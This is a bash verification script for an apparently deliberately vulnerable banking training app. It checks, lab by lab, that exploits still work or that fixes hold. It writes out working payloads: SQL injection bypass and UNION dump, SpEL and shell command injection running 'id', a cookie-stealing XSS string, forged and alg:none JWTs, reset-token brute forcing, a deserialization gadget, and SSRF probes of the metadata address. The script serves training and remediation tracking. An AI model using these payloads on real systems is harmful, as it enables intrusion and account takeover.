#!/usr/bin/env bash
#
# SecureBank Labs — verification script.
#
# This exercises every lab's exploit step against the running stack and asserts that
# the vulnerable behaviour is still present.
#
# IMPORTANT: this is the INVERSE of a regression suite. It must PASS while the
# vulnerabilities are present and FAIL once they have been fixed. That is what makes
# it useful as the checklist for the remediation pass.
#
# Usage:
#   ./scripts/verify-labs.sh              # verify everything
#   ./scripts/verify-labs.sh 1 2 10       # verify specific labs

set -uo pipefail

API="${API:-http://localhost:8080}"
REPORT="${REPORT:-http://localhost:8081}"
FRONTEND="${FRONTEND:-http://localhost}"

PASS=0
FAIL=0
FAILED_LABS=()

bold() { printf '\033[1m%s\033[0m\n' "$1"; }
green() { printf '\033[32m  PASS\033[0m %s\n' "$1"; }
red() { printf '\033[31m  FAIL\033[0m %s\n' "$1"; }

# check <description> <actual> <expected-substring>
check() {
  local desc="$1" actual="$2" expected="$3"
  if [[ "$actual" == *"$expected"* ]]; then
    green "$desc"
    PASS=$((PASS + 1))
  else
    red "$desc"
    echo "        expected to contain: $expected"
    echo "        got: ${actual:0:300}"
    FAIL=$((FAIL + 1))
    FAILED_LABS+=("$CURRENT_LAB")
  fi
}

# refute <description> <actual> <forbidden-substring>
refute() {
  local desc="$1" actual="$2" forbidden="$3"
  if [[ "$actual" != *"$forbidden"* ]]; then
    green "$desc"
    PASS=$((PASS + 1))
  else
    red "$desc"
    echo "        expected NOT to contain: $forbidden"
    FAIL=$((FAIL + 1))
    FAILED_LABS+=("$CURRENT_LAB")
  fi
}

get() { curl -s -H "Authorization: Bearer $TOKEN" "$@"; }
post() { curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" "$@"; }

# --- login ------------------------------------------------------------------
login() {
  curl -s -X POST "$API/api/auth/login" -H "Content-Type: application/json" \
    -d "{\"username\":\"$1\",\"password\":\"$2\"}" \
    | python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))" 2>/dev/null
}

bold "SecureBank Labs — vulnerability verification"
echo "API: $API   Report: $REPORT   Frontend: $FRONTEND"
echo

# Lab 19 changes alice's password as part of the exploit, so restore it first.
# The reset endpoint is itself vulnerable (predictable token), so we can mint a
# valid reset token offline and put the password back.
reset_alice_password() {
  local candidate
  for candidate in $(python3 - <<'PY'
import hashlib, time
username = "alice"
now = int(time.time())
for offset in range(-120, 121):
    print(hashlib.md5(f"{username}{now + offset}".encode()).hexdigest())
PY
); do
    curl -s -X POST "$API/api/a07/auth/reset-confirm" -H "Content-Type: application/json" \
      -d "{\"token\": \"$candidate\", \"new_password\": \"password123\"}" \
      | grep -q '"password_reset":true' && return 0
  done
  return 1
}

if ! login alice password123 >/dev/null 2>&1; then
  reset_alice_password >/dev/null 2>&1
fi

TOKEN="$(login alice password123)"
if [[ -z "$TOKEN" ]]; then
  red "Could not log in as alice - is the stack running?"
  exit 1
fi
echo "Logged in as alice."
echo

WANTED=("$@")

should_run() {
  [[ ${#WANTED[@]} -eq 0 ]] && return 0
  local candidate="$1"
  for want in "${WANTED[@]}"; do
    [[ "$candidate" == "$want" ]] && return 0
  done
  return 1
}

lab() {
  CURRENT_LAB="$1"
  bold "Lab $1 — $2"
}

# --- Lab 1: IDOR (FIXED on this branch) -------------------------------------
if should_run 1; then
  lab 1 "IDOR"
  OUT="$(get "$API/api/a01/accounts/2")"
  check "alice CANNOT read bob's account via /accounts/2" "$OUT" '"error"'
  refute "no balance is disclosed" "$OUT" '"balance"'
  refute "bob's account number is not leaked" "$OUT" '"ACC-1002"'
  check "a non-owner gets 404, not 403 (no enumeration oracle)" "$OUT" '"error":"Account not found"'
  OWN="$(get "$API/api/a01/accounts/1")"
  check "alice can still read her OWN account" "$OWN" '"account_number":"ACC-1001"'
fi

# --- Lab 2: privilege escalation (FIXED on this branch) ----------------------
if should_run 2; then
  lab 2 "Privilege escalation"
  OUT="$(get "$API/api/a01/admin/users")"
  check "a customer is refused by /admin/users" "$OUT" '"error":"Admin role required"'
  refute "the user list is not disclosed" "$OUT" '"username"'
  refute "password hashes are not disclosed" "$OUT" '"password_hash"'
  OUT="$(get "$API/api/a01/admin/accounts")"
  check "a customer is refused by /admin/accounts too" "$OUT" '"error":"Admin role required"'
  refute "no account balances are disclosed" "$OUT" '"balance"'
  ADMIN_TOKEN="$(login admin admin)"
  OUT="$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" "$API/api/a01/admin/users")"
  check "an admin token still works" "$OUT" '"username":"admin"'
fi

# --- Lab 3: SSRF (FIXED on this branch) -------------------------------------
if should_run 3; then
  lab 3 "SSRF"
  # The internal report service is only reachable by name on the Docker network,
  # so a successful fetch of it would prove the request came from inside.
  OUT="$(post "$API/api/a01/accounts/statement-email" \
    -d '{"account_id": 1, "callback_url": "http://report:8081/"}')"
  check "the internal report service is refused" "$OUT" '"error":"Callback URL is not allowed"'
  refute "no internal response body is returned" "$OUT" '"body"'
  refute "the target is not echoed back" "$OUT" '"sent_to"'
  OUT2="$(post "$API/api/a01/accounts/statement-email" \
    -d '{"account_id": 1, "callback_url": "http://169.254.169.254/latest/meta-data/"}')"
  check "the cloud metadata address is refused" "$OUT2" '"error":"Callback URL is not allowed"'
  refute "the metadata attempt is not echoed back" "$OUT2" '"sent_to"'
  OUT3="$(post "$API/api/a01/accounts/statement-email" \
    -d '{"account_id": 1, "callback_url": "http://report:8081/api/report/report/generate"}')"
  check "the SSTI pivot target is refused too" "$OUT3" '"error":"Callback URL is not allowed"'
  # Layer 1 - only http and https are accepted.
  OUT4="$(post "$API/api/a01/accounts/statement-email" \
    -d '{"account_id": 1, "callback_url": "file:///etc/passwd"}')"
  check "a non-http scheme is refused" "$OUT4" '"error":"Callback URL is not allowed"'
  # Layer 3 - the host allowlist rejects a public host that is not on it.
  OUT5="$(post "$API/api/a01/accounts/statement-email" \
    -d '{"account_id": 1, "callback_url": "http://example.com/"}')"
  check "a host that is not on the allowlist is refused" "$OUT5" '"error":"Callback URL is not allowed"'
  # Layer 3 - loopback is blocked even when the host resolves to it.
  OUT6="$(post "$API/api/a01/accounts/statement-email" \
    -d '{"account_id": 1, "callback_url": "http://127.0.0.1:8080/api/labs"}')"
  check "a loopback address is refused" "$OUT6" '"error":"Callback URL is not allowed"'
fi

# --- Lab 4: debug / stack trace (FIXED on this branch) -----------------------
if should_run 4; then
  lab 4 "Debug mode exposes config"
  # The endpoint is no longer public, so an anonymous caller is refused outright.
  OUT="$(curl -s -o /dev/null -w '%{http_code}' "$API/api/a02/debug")"
  check "the debug endpoint requires authentication" "$OUT" '401'
  # A customer is refused by the role check.
  OUT="$(get "$API/api/a02/debug")"
  check "a customer is refused by /debug" "$OUT" '"error":"Admin role required"'
  # An admin gets in, but no secret is returned.
  ADMIN_TOKEN4="$(login admin admin)"
  OUT="$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN4" "$API/api/a02/debug")"
  check "an admin can still reach /debug" "$OUT" '"debug":true'
  refute "the JWT secret is not returned" "$OUT" '"jwt.secret"'
  refute "the datasource URL is not returned" "$OUT" 'jdbc:postgresql'
  refute "the datasource password is not returned" "$OUT" '"spring.datasource.password"'
  # The deliberate failure now returns a generic message and no stack trace.
  # The endpoint is no longer on the public-path allowlist, so it needs a token
  # to reach the handler at all.
  OUT2="$(get "$API/api/a02/debug/boom")"
  check "the error response is a generic message" "$OUT2" '"error":"Internal server error"'
  check "the error response carries a correlation id" "$OUT2" '"correlation_id"'
  refute "no stack trace is returned" "$OUT2" '"trace"'
  refute "the error response does not repeat the JWT secret" "$OUT2" '"jwt.secret"'
  refute "the error response does not leak the configuration" "$OUT2" '"config"'
fi

# --- Lab 5: default admin credentials ---------------------------------------
if should_run 5; then
  lab 5 "Default admin credentials"
  ADMIN_TOKEN="$(login admin admin)"
  if [[ -z "$ADMIN_TOKEN" ]]; then
    red "admin/admin login failed"
    FAIL=$((FAIL + 1))
  else
    green "admin/admin signs in to the admin API"
    PASS=$((PASS + 1))
  fi
fi

# --- Lab 6: exposed files ----------------------------------------------------
if should_run 6; then
  lab 6 "Sensitive file exposure"
  OUT="$(curl -s "$API/.env")"
  check "/.env is served" "$OUT" 'JWT_SECRET'
  OUT="$(curl -s "$API/.git/config")"
  check "/.git/config is served" "$OUT" 'securebank-internet-banking.git'
  HTTP="$(curl -s -o /dev/null -w '%{http_code}' "$API/backup.zip")"
  check "/backup.zip is served" "$HTTP" '200'
fi

# --- Lab 7: MD5 hashes ------------------------------------------------------
if should_run 7; then
  lab 7 "Unsalted MD5 password hashes"
  OUT="$(get "$API/api/a04/hashes")"
  check "hashes endpoint returns MD5 digests" "$OUT" '482c811da5d5b4bc6d497ffa98491e38'
  check "hashes endpoint reports no salt" "$OUT" '"salted":false'
  OUT="$(get "$API/api/a04/crack")"
  check "alice's password is cracked in-app" "$OUT" 'password123'
fi

# --- Lab 8: hardcoded JWT secret --------------------------------------------
if should_run 8; then
  lab 8 "Hardcoded JWT secret"
  FORGED="$(python3 - <<'PY'
import base64, json, hmac, hashlib

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"user_id": 3, "username": "admin", "role": "admin"}).encode())
sig = b64url(hmac.new(b"secret", f"{header}.{payload}".encode(), hashlib.sha256).digest())
print(f"{header}.{payload}.{sig}")
PY
)"
  OUT="$(curl -s -H "Authorization: Bearer $FORGED" "$API/api/a10/transfers/history")"
  check "token signed with 'secret' is accepted as admin" "$OUT" '"requested_role":"admin"'
fi

# --- Lab 9: PII in cleartext ------------------------------------------------
if should_run 9; then
  lab 9 "PII in cleartext responses"
  OUT="$(get "$API/api/a04/profile")"
  check "full account number is returned" "$OUT" '"account_number":"ACC-1001"'
  check "sort code is returned" "$OUT" '"sort_code"'
fi

# --- Lab 10: SQL injection ---------------------------------------------------
if should_run 10; then
  lab 10 "SQL injection"
  OUT="$(curl -s -X POST "$API/api/a05/auth/login" -H "Content-Type: application/json" \
    -d '{"username":"admin'\'' --","password":"anything"}')"
  check "login bypass with admin' --" "$OUT" '"token"'
  check "bypass returned the admin account" "$OUT" '"role":"admin"'
  OUT="$(get "$API/api/a05/transfers/search?q='+UNION+SELECT+username,password_hash,email,role,id+FROM+users--")"
  check "UNION SELECT dumps the users table" "$OUT" '"count":4'
fi

# --- Lab 11: SSTI via SpEL --------------------------------------------------
if should_run 11; then
  lab 11 "SSTI (SpEL)"
  OUT="$(post "$API/api/a05/transfers/1/remark" -d '{"remark": "7*7"}')"
  check "arithmetic expression is evaluated" "$OUT" '49'
  OUT="$(post "$API/api/a05/transfers/1/remark" \
    -d '{"remark": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String[]{\"id\"})"}')"
  check "Runtime.exec is reachable via SpEL" "$OUT" 'uid='
fi

# --- Lab 12: SSTI + command injection (report service) ----------------------
if should_run 12; then
  lab 12 "SSTI + OS command injection"
  OUT="$(curl -s -X POST "$REPORT/api/report/report/generate" -H "Content-Type: application/json" \
    -d '{"account_id": "1001", "template": "Secret: ${config.secretKey}"}')"
  check "internal secret key is extracted from the template" "$OUT" 'sb-report-internal-secret'
  # The date filter is concatenated into `sh -c "echo 'From: <from> To: <to>' && date"`,
  # so a single quote in the date closes the quoted argument and everything after it
  # is executed as a separate command.
  DATE_BODY="$(mktemp)"
  cat > "$DATE_BODY" <<'JSON'
{"from_date": "2024-01-01' && id && echo '", "to_date": "2024-12-31"}
JSON
  OUT="$(curl -s -X POST "$REPORT/api/report/report/date-filter" -H "Content-Type: application/json" \
    --data-binary "@$DATE_BODY")"
  rm -f "$DATE_BODY"
  check "command injection runs 'id'" "$OUT" 'uid='
fi

# --- Lab 13: stored XSS -----------------------------------------------------
if should_run 13; then
  lab 13 "Stored XSS"
  OUT="$(post "$API/api/a05/transfers/send" \
    -d '{"from_account_id":1,"to_account_id":2,"amount":1,"note":"<img src=x onerror=alert(document.cookie)>"}')"
  check "note with a script payload is stored verbatim" "$OUT" 'onerror=alert'
  OUT="$(get "$API/api/a05/transfers")"
  check "payload is returned to every client" "$OUT" 'onerror=alert'
fi

# --- Lab 14: negative transfer ----------------------------------------------
if should_run 14; then
  lab 14 "Negative transfer amount"
  BEFORE="$(get "$API/api/a01/accounts/1")"
  OUT="$(post "$API/api/a06/transfers/" \
    -d '{"from_account_id": 2, "to_account_id": 1, "amount": -1000}')"
  check "negative transfer is accepted" "$OUT" '"transfer_id"'
  AFTER="$(get "$API/api/a01/accounts/1")"
  if [[ "$BEFORE" != "$AFTER" ]]; then
    green "negative transfer changed alice's balance"
    PASS=$((PASS + 1))
  else
    red "negative transfer did not change alice's balance"
    FAIL=$((FAIL + 1))
  fi
fi

# --- Lab 15: mass assignment ------------------------------------------------
if should_run 15; then
  lab 15 "Mass assignment"
  OUT="$(curl -s -X PATCH "$API/api/a06/profile" -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"username": "alice", "email": "alice@bank.com", "role": "admin"}')"
  check "role was changed to admin via the profile endpoint" "$OUT" '"role":"admin"'
  # restore
  curl -s -X PATCH "$API/api/a06/profile" -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"username": "alice", "email": "alice@bank.com", "role": "customer"}' >/dev/null
fi

# --- Lab 16: account enumeration --------------------------------------------
if should_run 16; then
  lab 16 "Account enumeration"
  MISSING="$(curl -s -X POST "$API/api/a06/auth/login/" -H "Content-Type: application/json" \
    -d '{"username": "notauser", "password": "anything"}')"
  EXISTING="$(curl -s -X POST "$API/api/a06/auth/login/" -H "Content-Type: application/json" \
    -d '{"username": "alice", "password": "wrongpassword"}')"
  check "missing user is reported as 'User not found'" "$MISSING" 'User not found'
  check "existing user is reported as 'Incorrect password'" "$EXISTING" 'Incorrect password'
  if [[ "$MISSING" != "$EXISTING" ]]; then
    green "the two error responses differ"
    PASS=$((PASS + 1))
  else
    red "the two error responses are identical"
    FAIL=$((FAIL + 1))
  fi
fi

# --- Lab 17: brute force ----------------------------------------------------
if should_run 17; then
  lab 17 "No rate limiting"
  FOUND=0
  for pw in password123 letmein welcome qwerty123 monkey dragon; do
    OUT="$(curl -s -X POST "$API/api/a07/auth/login" -H "Content-Type: application/json" \
      -d "{\"username\":\"alice\",\"password\":\"$pw\"}")"
    if [[ "$OUT" == *'"token"'* ]]; then
      FOUND=$((FOUND + 1))
    fi
  done
  if [[ "$FOUND" -gt 0 ]]; then
    green "multiple guesses were accepted without throttling"
    PASS=$((PASS + 1))
  else
    red "no guess succeeded"
    FAIL=$((FAIL + 1))
  fi
  OUT="$(get "$API/api/a07/auth/attempts")"
  check "attempts are counted but never blocked" "$OUT" 'attempts'
fi

# --- Lab 18: session fixation -----------------------------------------------
if should_run 18; then
  lab 18 "Session fixation"
  COOKIE_JAR="$(mktemp)"
  SID="$(curl -s -c "$COOKIE_JAR" -X POST "$API/api/a07/session/init" \
    | python3 -c "import sys,json; print(json.load(sys.stdin)['session_id'])" 2>/dev/null)"
  curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" -X POST "$API/api/a07/auth/login-session" \
    -H "Content-Type: application/json" \
    -d '{"username":"alice","password":"password123"}' >/dev/null
  OUT="$(curl -s -b "$COOKIE_JAR" "$API/api/a07/session/whoami")"
  check "the pre-login session id is now authenticated" "$OUT" '"username":"alice"'
  check "the session id was not regenerated" "$OUT" "\"session_id\":\"$SID\""
  rm -f "$COOKIE_JAR"
fi

# --- Lab 19: predictable reset token ----------------------------------------
if should_run 19; then
  lab 19 "Predictable password reset token"
  OUT="$(curl -s -X POST "$API/api/a07/auth/reset-request" -H "Content-Type: application/json" \
    -d '{"username": "alice"}')"
  check "a reset token is issued" "$OUT" '"token"'
  COMPUTED="$(python3 - <<'PY'
import hashlib, time
username = "alice"
now = int(time.time())
for offset in range(-30, 31):
    ts = now + offset
    print(hashlib.md5(f"{username}{ts}".encode()).hexdigest())
PY
)"
  MATCHED=0
  while read -r candidate; do
    OUT="$(curl -s -X POST "$API/api/a07/auth/reset-confirm" -H "Content-Type: application/json" \
      -d "{\"token\": \"$candidate\", \"new_password\": \"hacked123\"}")"
    if [[ "$OUT" == *'"password_reset":true'* ]]; then
      MATCHED=1
      break
    fi
  done <<< "$COMPUTED"
  if [[ "$MATCHED" -eq 1 ]]; then
    green "an offline-computed token was accepted"
    PASS=$((PASS + 1))
  else
    red "no computed token was accepted"
    FAIL=$((FAIL + 1))
  fi
  # restore alice's password so the next run can log in
  reset_alice_password >/dev/null 2>&1
  login alice password123 >/dev/null 2>&1
fi

# --- Lab 20: insecure deserialization ---------------------------------------
if should_run 20; then
  lab 20 "Insecure deserialization"
  PAYLOAD="$(mktemp)"
  cat > "$PAYLOAD" <<'JSON'
{"@class":"com.securebank.lab.a08.gadget.AccountImportJob","command":"id"}
JSON
  OUT="$(curl -s -X POST "$API/api/a08/integrity/import-account" \
    -H "Authorization: Bearer $TOKEN" -F "data=@$PAYLOAD")"
  check "uploaded payload is deserialised" "$OUT" '"imported"'
  check "the gadget executed the command during deserialisation" "$OUT" 'uid='
  rm -f "$PAYLOAD"
  OUT="$(curl -s -X POST "$API/api/a08/integrity/import-account/describe" \
    -H "Authorization: Bearer $TOKEN")"
  check "default typing is enabled on the mapper" "$OUT" 'enabled'
fi

# --- Lab 21: JWT alg:none ---------------------------------------------------
if should_run 21; then
  lab 21 "JWT algorithm confusion"
  FORGED="$(python3 - <<'PY'
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b"=").decode()

header = b64url({"alg": "none", "typ": "JWT"})
payload = b64url({"user_id": 3, "username": "admin", "role": "admin"})
print(f"{header}.{payload}.")
PY
)"
  OUT="$(curl -s -H "Authorization: Bearer $FORGED" "$API/api/a10/transfers/history")"
  check "unsigned alg:none token is accepted as admin" "$OUT" '"requested_role":"admin"'
fi

# --- Lab 22: unrestricted upload --------------------------------------------
if should_run 22; then
  lab 22 "Unrestricted file upload"
  TMPFILE="$(mktemp)"
  echo "SHELL_HERE" > "$TMPFILE"
  OUT="$(curl -s -X POST "$API/api/a08/kyc-upload" -H "Authorization: Bearer $TOKEN" -F "file=@$TMPFILE")"
  check "file is accepted and a URL is returned" "$OUT" '"uploaded":true'
  URL="$(echo "$OUT" | python3 -c "import sys,json; print(json.load(sys.stdin).get('url',''))" 2>/dev/null)"
  BODY="$(curl -s "$API$URL")"
  check "the uploaded file is served back from the web root" "$BODY" 'SHELL_HERE'
  rm -f "$TMPFILE"
fi

# --- Lab 23: verbose error (the global handler no longer leaks) -------------
if should_run 23; then
  lab 23 "Verbose error with stack trace"
  OUT="$(curl -s "$API/api/a10/transfers/account-summary?id=abc")"
  refute "no stack trace is returned to the client" "$OUT" 'NumberFormatException'
  refute "the internal call chain is not exposed" "$OUT" '"trace"'
  refute "the configuration is not leaked with the error" "$OUT" '"jwt.secret"'
fi

# --- Lab 24: type coercion --------------------------------------------------
if should_run 24; then
  lab 24 "Error-based info disclosure"
  OUT="$(post "$API/api/a10/transfers/send" \
    -d '{"from_account_id": 1, "to_account_id": 2, "amount": "notanumber"}')"
  check "a type error is returned" "$OUT" 'NumberFormatException'
  check "the error names the amount parameter" "$OUT" 'amount'
fi

# --- Lab 25: auth bypass on exception ---------------------------------------
if should_run 25; then
  lab 25 "Authentication bypass on exception"
  NO_TOKEN="$(curl -s -o /dev/null -w '%{http_code}' "$API/api/a10/transfers/history")"
  check "no token is rejected with 401" "$NO_TOKEN" '401'
  GARBAGE="$(curl -s -o /dev/null -w '%{http_code}' \
    -H "Authorization: Bearer THISISNOTAVALIDTOKEN" "$API/api/a10/transfers/history")"
  check "a garbage token is ACCEPTED (fail-open)" "$GARBAGE" '200'
  OUT="$(curl -s -H "Authorization: Bearer THISISNOTAVALIDTOKEN" "$API/api/a10/transfers/history")"
  check "the garbage token was treated as admin" "$OUT" '"transfers"'
fi

# --- summary -----------------------------------------------------------------
echo
bold "Summary"
echo "  passed: $PASS"
echo "  failed: $FAIL"
if [[ "$FAIL" -gt 0 ]]; then
  echo "  labs with failures: ${FAILED_LABS[*]}"
  exit 1
fi
echo
echo "All checks passed - the labs are still exploitable."
